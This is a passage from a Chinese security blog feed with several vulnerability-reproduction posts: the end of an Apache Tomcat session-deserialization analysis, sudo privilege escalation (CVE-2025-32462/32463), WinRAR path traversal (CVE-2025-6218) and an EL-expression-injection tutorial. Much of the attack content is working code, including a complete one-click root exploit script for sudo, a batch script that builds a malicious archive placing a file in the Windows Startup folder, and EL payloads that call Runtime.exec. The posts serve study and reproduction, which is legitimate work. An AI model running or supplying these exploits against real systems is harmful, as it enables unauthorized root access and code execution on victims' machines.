class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        randAccessContentFile.close();</span><br><span class="line">        <span class="keyword">return</span> contentFile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概就是，将一个path中的<code>/</code>替换为<code>.</code>后当作<strong>文件名</strong>，然后写入到工作目录下的ROOT路径下的 <code>.evil.session</code>中</p>
<p>当走到<code>return contentFile</code>时，我们的恶意文件已经写好了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306502782-75a3218a-cd86-4a7f-9906-387ee897932a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306502782-75a3218a-cd86-4a7f-9906-387ee897932a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="i44Wy">触发反序列化源码分析</h3>
下断点后，我们可以看到，调用流程如下，我们从比较重要的`load`方法开始分析

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742307609786-55fc94e9-aed4-43ca-bf2b-26d9255ccc32.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742307609786-55fc94e9-aed4-43ca-bf2b-26d9255ccc32.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这个触发点在<code>FileStore</code>中的<code>load</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Session <span class="title function_">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">// Open an input stream to the specified pathname, if any</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> file(id);</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || !file.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> getManager().getContext();</span><br><span class="line">        <span class="type">Log</span> <span class="variable">contextLog</span> <span class="operator">=</span> context.getLogger();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contextLog.isTraceEnabled()) &#123;</span><br><span class="line">            contextLog.trace(sm.getString(getStoreName() + <span class="string">&quot;.loading&quot;</span>, id, file.getAbsolutePath()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">oldThreadContextCL</span> <span class="operator">=</span> context.bind(Globals.IS_SECURITY_ENABLED, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> getObjectInputStream(fis)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession) manager.createEmptySession();</span><br><span class="line">            session.readObjectData(ois);</span><br><span class="line">            session.setManager(manager);</span><br><span class="line">            <span class="keyword">return</span> session;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">                contextLog.debug(sm.getString(<span class="string">&quot;fileStore.noFile&quot;</span>, id, file.getAbsolutePath()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看到<code>file</code>方法中，这里会接受到我们Cookie中的id，然后与<code>.session</code>拼接起来，然后将文件名为<code>.evil.session</code>的File类型的属性返回回去</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306740421-90bb2aa0-7f64-4576-aeb5-1e1a1f185a00.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306740421-90bb2aa0-7f64-4576-aeb5-1e1a1f185a00.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>返回后，会将文件的内容以流的方式去读出来，然后放到<code>StandardSession.readObjectData</code>中去进行反序列化操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306996842-5d707a6e-4710-4778-987b-c97ff22c489c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742306996842-5d707a6e-4710-4778-987b-c97ff22c489c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>readObjectData</code>的调用流程如下，最后调用<code>readObject</code>反序列化，触发我们构造的CC6链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">session.readObjectData(ois);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readObjectData</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        doReadObject(stream);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        ......</span><br><span class="line">        creationTime = ((Long) stream.readObject()).longValue();</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742307405247-25dab56e-1107-4372-ac56-28637babeb3a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742307405247-25dab56e-1107-4372-ac56-28637babeb3a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Cn578">小结</h3>
漏洞触发的流程如下

<ol>
<li>攻击者通过<code>partialPut</code>方法向临时文件存放的文件夹下写入带有恶意反序列化数据的文件（这个临时文件夹也是session临时存放的文件夹），利用替换机制（<code>/</code>替换为<code>.</code>）构造一个符合session文件名称标准的文件</li>
<li>在Cookie中带上<code>JSESSIONID=.evil</code>，tomcat会从session临时存放的位置中，寻找<code>.id.session</code>文件，将文件中的数据进行反序列化操作，从而触发恶意攻击链</li>
</ol>
<h2 id="mlN0N">结语</h2>
最近在学java安全，看到学长发出来的新漏洞，就想着调试分析一下，也是拖了好几天哈哈哈哈，分析下来，感觉整个流程很容易理解，但是发现感觉是很难了QAQ

<p>如果在文章中存在一些错误的地方，望大佬们指正，我是<strong>小白</strong>轻点喷&gt;_&lt;</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-32462/32463Sudo提权</title>
    <url>/2025/07/20/CVE-2025-32462-32463Sudo%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="FshB2">CVE-2025-32462</h1>

<p><font style="color:rgb(34, 34, 38);">CVE-2025-32462-Linux sudo本地提权漏洞复现</font></p>
<h2 id="VxNzu">漏洞详情</h2>
<h3 id="otMtR">漏洞介绍</h3>

<p>sudo 是 Linux 系统中用来管理权限的核心工具，用来授权用户临时获取 root 或者其他用户权限执行命令，既保障系统安全又便于操作。</p>
<p><font style="color:rgb(34, 34, 38);">CVE-2025-32462的Linux sudo 本地权限提升漏洞在于 sudo 的 -h（–host）选项存在缺陷，该选项本应与 -l（–list）配合使用来查询远程主机权限，但实际未严格限制其仅用于查询功能，导致攻击者可能结合命令执行或文件编辑操作实现本地提权</font></p>
<h3 id="xHYi1">影响版本</h3>

<ul>
<li>1.8.8 &lt;&#x3D; sudo &lt;&#x3D; 1.8.32</li>
<li>1.9.0 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17</li>
</ul>
<h3 id="d4rFq">利用条件</h3>

<ul>
<li>本地低权限用户</li>
<li>存在基于主机的权限规则：可以在<code>/etc/sudoers</code>中定义Host或者Host-Aias</li>
<li>知道允许执行命令的远程主机名</li>
</ul>
<h2 id="reMdQ">漏洞复现</h2>
<h3 id="bkArn">环境配置</h3>

<ul>
<li>Ubuntu20.0.4</li>
<li>Sudo1.8.31</li>
</ul>
<p>可以通过以下命令查看sudo版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606787028-e267ceea-e26c-4af2-81b3-2ba1eeed46a2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606787028-e267ceea-e26c-4af2-81b3-2ba1eeed46a2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在正常情况下可以看到，<code>sudo -i</code>会提示输入密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606757206-d87e7ddf-3462-4c10-9b84-d6b544abfebd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606757206-d87e7ddf-3462-4c10-9b84-d6b544abfebd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="oiQIY">漏洞复现</h3>

<p>首先我们需要编辑sudoers文件，将以下内容添加进去</p>
<p>如果说没有权限，可以使用chmod加一个可写权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加可写权限</span></span><br><span class="line">sudo chmod +w /etc/sudoers</span><br><span class="line"><span class="comment">//添加内容</span></span><br><span class="line">ubuntu     ci.test.local  = NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606966826-77358320-bfbb-4a13-8ebc-671fd038e4db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751606966826-77358320-bfbb-4a13-8ebc-671fd038e4db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>此时使用以下命令就可以提权成功（就是要等一会）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo -h ci.test.local 命令</span><br><span class="line">sudo -i -h ci.test.local</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751608680915-f6746295-27b1-4717-b6fe-2794d3e6f0eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751608680915-f6746295-27b1-4717-b6fe-2794d3e6f0eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h1 id="RYX64">CVE-2025-32463</h1>
<h2 id="UvwHH">漏洞详情</h2>
<h3 id="XpWpn">漏洞介绍</h3>

<p>从1.9.14版本的sudo后，就引用了-R(–chroot)选项，本意是用来让用户通过该选项，去指定chroot的目录下执行具有root权限的命令，保证执行环境的隔离。</p>
<p>Linux sudo chroot 权限提升漏洞(CVE-2025-32463)的原理主要就是利用sudo的一个-R&#x2F;–chroot选项，该工具开始在评估sudoers文件之前解析chroot环境中的路径。这意味着攻击者可以诱骗Sudo读取伪造的<code>/etc/nsswitch.conf</code>文件——该文件会指示加载恶意共享库如libnss_&#x2F;woot1337.so.2</p>
<h3 id="putgV">影响版本</h3>

<ul>
<li>1.9.14 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17</li>
</ul>
<p>**注意：**Sudo 的旧版本（&lt;&#x3D; 1.8.32）不会受到此攻击，因为在旧版本中并不存在 chroot 功能。</p>
<h3 id="lMcqQ">利用条件</h3>
只需要拥有：本地低权限用户的权限即可

<h3 id="l2o73">漏洞核心</h3>

<p>sudo在解析与sudoers的相匹配的命令之前，会先进入一个我们可以控制的chroot环境，也就是我们-R指定的目录下。而当我们在这个目录下写一些恶意的配置文件如：</p>
<ul>
<li>&#x2F;etc&#x2F;nsswitch.conf</li>
<li>恶意libnss_*.so动态链接库</li>
<li>&#x2F;etc&#x2F;passwd，&#x2F;etc&#x2F;group等</li>
</ul>
<p>而当sudo解析用户、组、主机名等权限进行匹配glibc Nss（Name Service Switch）时，会触发我们在该目录下的恶意动态库，从而进行提权</p>
<p>漏洞流程如下：</p>
<ol>
<li>在执行sudoers检查前，解析用户信息</li>
<li>用户信息的解析依赖于getpwnam()等glibc函数</li>
<li>glibc根据&#x2F;etc&#x2F;nsswitch.conf加载libnss_*动态库</li>
<li>进入了可控的chroot环境，从而加载用户伪造的恶意库</li>
<li>恶意库在加载时，使用root权限执行代码</li>
<li>从而无需匹配sudoers，即可以root权限执行任何代码</li>
</ol>
<h2 id="mvWqv">漏洞复现</h2>
<h3 id="o9DzE">环境配置 </h3>

<ul>
<li>ubuntu20.04</li>
<li>Sudo1.9.14</li>
</ul>
<h3 id="a7npX">漏洞复现</h3>
<h2 id="kdR8a">手动复现</h2>
<h3 id="tFTk1">一键提权EXP</h3>

<p>可以一键提权的EXP内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># sudo-chwoot.sh</span><br><span class="line"># CVE-<span class="number">2025</span>-<span class="number">32463</span> – Sudo EoP Exploit PoC by Rich Mirch</span><br><span class="line">#                  @ Stratascale Cyber Research <span class="title function_">Unit</span> <span class="params">(CRU)</span></span><br><span class="line">STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)</span><br><span class="line">cd $&#123;STAGE?&#125; || exit <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cat &gt; woot1337.c&lt;&lt;EOF</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="keyword">void</span> <span class="title function_">woot</span><span class="params">(<span class="keyword">void</span>)</span> &#123;</span><br><span class="line">  setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo <span class="string">&quot;passwd: /woot1337&quot;</span> &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so<span class="number">.2</span> woot1337.c</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;woot!&quot;</span></span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125; ##清理痕迹</span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-6218 WinRAR路径穿越</title>
    <url>/2025/07/18/CVE-2025-6218WinRAR%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/</url>
    <content><![CDATA[<h1 id="lMhHI">CVE-2025-6218 WinRAR路径穿越</h1>
<h2 id="jSnM6">漏洞情况</h2>
<h3 id="NBKkm">漏洞简介</h3>

<p>RARLAB公司的WinRAR压缩软件中发现了一个严重安全漏洞，CVE-2025-6218（路径穿越漏洞），攻击者可通过构造恶意的压缩文件，实现在压缩文件解压时可以将文件释放到受害者系统的敏感路径下（例如自启动目录），进而实现远程代码执行或者持久化控制。</p>
<p>攻击需要目标用户访问恶意网页或打开恶意压缩文件，因此容易受到社会工程攻击。</p>
<h3 id="WOpRX">利用条件</h3>

<ul>
<li>需要WinRAR 安装在默认位置：C:\Program Files\WinRAR\WinRAR.exe（或已知WinRAR的安装目录）</li>
<li>需要目标用户访问恶意网页或解压缩恶意压缩文件</li>
</ul>
<h3 id="I3Qc6">影响范围</h3>

<p><font style="color:rgb(51, 51, 51);">RARLAB WinRAR 7.11版本及更早版本（2025年6月19日补丁发布前的所有版本）</font></p>
<blockquote>
<p>建议升级到WinRAR7.12及更高版本</p>
</blockquote>
<h2 id="aKTHL">漏洞复现</h2>
<h3 id="LdPua">环境配置</h3>

<p>这里在虚拟机上进行漏洞的复现（环境自行配置即可）</p>
<ul>
<li>Windows2012</li>
<li>WinRAR7.10</li>
</ul>
<h3 id="RBIo2">压缩包构造脚本</h3>

<p>恶意压缩文件的构造代码如下，将其写入<code>CVE-2025-6218.bat</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@echo</span> off</span><br><span class="line">title CVE-<span class="number">2025</span>-<span class="number">6218</span> POC</span><br><span class="line"></span><br><span class="line">echo calc.exe &gt; POC.bat</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;C:\Program Files\WinRAR\WinRAR.exe&quot;</span> a -ap<span class="string">&quot; \.. \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&quot; %~dp0CVE-2025-6218.zip POC.bat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo.</span></span><br><span class="line"><span class="string">if errorlevel 1 (</span></span><br><span class="line"><span class="string">    echo [!] Failed to create POC.</span></span><br><span class="line"><span class="string">) else (</span></span><br><span class="line"><span class="string">    echo [+] CVE-2025-6218.zip created successfully!</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">echo.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">del POC.bat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause</span></span><br></pre></td></tr></table></figure>

<p>其中核心部分为以下代码，该代码将被打包的恶意文件构造到了恶意压缩包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\WinRAR\WinRAR.exe&quot;</span> a -ap<span class="string">&quot; \.. \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&quot; %~dp0CVE-2025-6218.zip POC.bat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//a 代表添加文件到压缩包</span></span><br><span class="line"><span class="string">//-ap 设置压缩包内的相对路径（就在这里尝试路径穿越）</span></span><br><span class="line"><span class="string">//%~dp0 代表当前脚本所在的路径</span></span><br><span class="line"><span class="string">//Poc.bat 需要被打包的恶意文件</span></span><br></pre></td></tr></table></figure>

<h3 id="a7UX7">漏洞实现</h3>

<p>我们在有WinRAR的机器上运行<code>CVE-2025-6218.bat</code>，构造我们的恶意压缩文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751374880910-52cac36e-bcbc-4cdf-8666-5d7dad641c9d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751374880910-52cac36e-bcbc-4cdf-8666-5d7dad641c9d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>将恶意的压缩包上传到我们的目标机器后，用WinRAR进行解压缩</p>
<p>右键压缩包，选择【提取到XXX】进行提取文件，批处理文件将被提取到 Windows 启动文件夹下，假设从当前工作目录向上导航两个目录会转到用户的主目录 （%USERPROFILE%）。<code>%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
<p>这里第二次进行解压缩的时候，我们看到解压的路径如下，其中的<code>..\</code>会走到上级目录，最终的目录是<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\CVE-<span class="number">2025</span>-<span class="number">6218</span>-POC-main\CVE-<span class="number">2025</span>-<span class="number">6218</span>\\..\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375688728-a01c2071-b6a0-4de8-b725-437f32b13db1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375688728-a01c2071-b6a0-4de8-b725-437f32b13db1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在Administrator的自启动目录下，我们可以找到我们的<code>Poc.bat</code>文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375800881-34f186d0-02dc-41a1-a9fd-ccf7c7d058e0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375800881-34f186d0-02dc-41a1-a9fd-ccf7c7d058e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">当计算机重启后，就会执行我们所被打包的恶意文件，进行RCE（远程命令执行）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375902280-f5a93dab-5671-47f5-a9b8-338ce92e5ea5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751375902280-f5a93dab-5671-47f5-a9b8-338ce92e5ea5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="KY9sl">免责声明</h2>
本文只用作技术分析和学习，任何利用本文内容进行非法攻击的行为均与作者无关！！！

]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>EL表达式注入</title>
    <url>/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="LcMib"> EL表达式注入</h1>

<p>今天来学习<strong>EL表达式注入</strong></p>
<h2 id="hKZSz">前置基础</h2>
EL（全称 Expression Language）表达式语言

<p><strong>作用</strong>：</p>
<ul>
<li>简化JSP页面内的Java代码</li>
<li>主要作用为 **获取数据 。**从域中获取数据，然后将数据展示出来</li>
</ul>
<p><strong>用法</strong>：</p>
<p>使用的前提是通过page标签设置不忽略EL表达式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<p><strong>基础操作符：</strong></p>
<p>这里我们列出来几个较为重要的算术和逻辑操作符</p>
<table>
<thead>
<tr>
<th><strong><font style="color:rgb(79, 79, 79);">操作</font><strong><strong><font style="color:rgb(79, 79, 79);"></font></strong></strong><font style="color:rgb(79, 79, 79);">符</font></strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>.</strong></td>
<td><strong>访问一个Bean属性或者一个映射条目 ${param.order}</strong></td>
</tr>
<tr>
<td><strong>[]</strong></td>
<td><strong>访问一个数组或者链表的元素 ${param[“order”]}</strong></td>
</tr>
<tr>
<td><strong>()</strong></td>
<td><strong><font style="color:rgb(79, 79, 79);">组织一个子表达式以改变优先级</font></strong></td>
</tr>
</tbody></table>
<p><strong>语法</strong>：</p>
<p>EL表达式的用法为<code>$&#123;expression&#125;</code></p>
<p>例如<code>$&#123;&lt;font style=&quot;color:rgb(102, 102, 102);&quot;&gt;userinfo&lt;/font&gt;&#125;</code>代表从<strong>域</strong>中获取变量userinfo的值</p>
<p>而JSP中存在四大域，分别为</p>
<ul>
<li>page：当前页面有效</li>
<li>request：当前请求有效</li>
<li>session：当前会话有效</li>
<li>application：当前应用有效</li>
</ul>
<p>EL表达式获取数据时，依次从以上四个域中获取，直到寻找到该变量（若没有找到则返回<code>&quot;&quot;</code>）</p>
<p>有些双亲委派的味道</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="lmwyA">EL表达式漏洞注入</h2>
<h3 id="H87dn">漏洞原理</h3>

<p>EL表达式注入漏洞的漏洞原理是：<strong>表达式外部可控</strong>导致攻击者注入恶意表达式从而实现任意代码执行，SpEL、OGNL等表达式注入也是一样的漏洞原理</p>
<p>一般来说，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是外部获取的</p>
<h3 id="w7Oa7">通用的Poc</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ciMuc">简单的漏洞利用</h3>
当存在一个参数`X`可控时，可以插入到JSP页面中

<p>我们将参数<code>X</code>设为以下payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>当我们访问JSP页面时，服务端就会解析构造的恶意EL表达式，从而造成EL表达式注入</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在实际的应用场景中，几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而且目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的</p>
<h4 id="简单漏洞场景之-CVE-2011-2730">简单漏洞场景CVE-2011-2730</h4>
参考链接：[https://juejin.cn/post/6844903572077838350](https://juejin.cn/post/6844903572077838350)

<p>正常情况下使用message标签，text属性使用EL表达式从请求中取值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://www.springframework.org/tags&quot;</span> prefix=<span class="string">&quot;spring&quot;</span>%&gt;</span><br><span class="line">&lt;spring:message  text=<span class="string">&quot;$&#123;param.a&#125;&quot;</span>&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>

<p>当我们访问以下url时候，<code>$&#123;applicationScope&#125;</code>就会被当作EL表达式执行</p>
<p>我们改变EL表达式的内容，就可以达到其他目的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/tag.jsp?a=$&#123;applicationScope&#125;</span></span><br></pre></td></tr></table></figure>

